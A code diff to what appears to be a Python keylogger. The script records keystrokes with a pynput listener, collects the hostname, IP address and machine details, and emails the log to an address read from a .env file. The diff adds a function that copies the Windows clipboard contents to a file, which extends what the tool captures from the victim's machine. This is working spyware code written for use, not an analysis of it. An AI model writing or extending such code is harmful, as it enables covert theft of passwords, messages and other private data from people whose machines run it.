@@ -29,6 +29,8 @@ import re as r
 
 script_directory = os.path.dirname(os.path.abspath(__file__))
 log_file_path = os.path.join(script_directory, "log.txt")
+system_info_path = os.path.join(script_directory, "system_info.txt")
+clipboard_path = os.path.join(script_directory, "clipboard.txt")
 env_path = os.path.join(script_directory, ".env")
 load_dotenv(env_path)
 
@@ -115,7 +117,7 @@ def getIP():
     return r.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)
 
 def write_system_info():
-	with open(log_file_path,"a") as out:
+	with open(system_info_path,"w") as out:
 		hostname = socket.gethostname()
 		IP_addr = socket.gethostbyname(hostname)
 		print(IP_addr, type(IP_addr))
@@ -130,14 +132,25 @@ def write_system_info():
 		+ "\nMachine -> " + platform.machine()	
 		)
 
+def copy_clipboard():
+    with open(clipboard_path,"w") as out:
+        try:
+            win32clipboard.OpenClipboard()
+            copied_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            out.write("Clipboard data:\n" + copied_data)
+        except:
+            out.write("Clipboard cannot be copied")
+
 def on_release(key):
 	# break loop on pressing esc
 	if key == Key.esc :
 		write_log()
 		write_system_info()
+		copy_clipboard()
 		send_email("log.txt", log_file_path, toAddress)
 		return False
-		
+
 
 # what to do when a key is pressed and released respectively
 with Listener(on_press = on_press, on_release = on_release) as listener:
